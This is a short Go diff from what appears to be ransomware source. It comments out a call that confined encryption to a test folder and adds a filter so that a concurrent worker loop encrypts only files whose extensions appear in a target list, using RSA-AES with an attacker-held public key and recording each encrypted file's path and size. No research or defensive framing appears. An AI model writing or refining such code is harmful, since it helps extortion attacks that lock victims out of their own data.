@@ -34,9 +34,9 @@ func main() {
 		panic(err)
 	}
 
-	currentDirectory, _ := os.Getwd()
-	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-	encryptFiles([]string{dir}, clientPubKeys)
+	// currentDirectory, _ := os.Getwd()
+	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	// encryptFiles([]string{dir}, clientPubKeys)
 
 	if currentUser, err = user.Current(); err != nil {
 		panic(err)
@@ -117,10 +117,14 @@ func encryptFiles(dirPaths []string, cPubKey *rsa.PublicKey) {
 		waitGroup.Add(1)
 		go func() {
 			for file := range filesToVisit {
-				err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
-				if err == nil {
-					encryptedList = append(encryptedList, utils.FileInfo{
-						Path: file.Path, Size: int(file.Info.Size())})
+				_, mapContains := utils.FileType[file.Extension]
+
+				if mapContains {
+					err = io.EncryptFile(&file, encryption.RSAAESEncrypt, cPubKey)
+					if err == nil {
+						encryptedList = append(encryptedList, utils.FileInfo{
+							Path: file.Path, Size: int(file.Info.Size())})
+					}
 				}
 			}
 			defer waitGroup.Done()
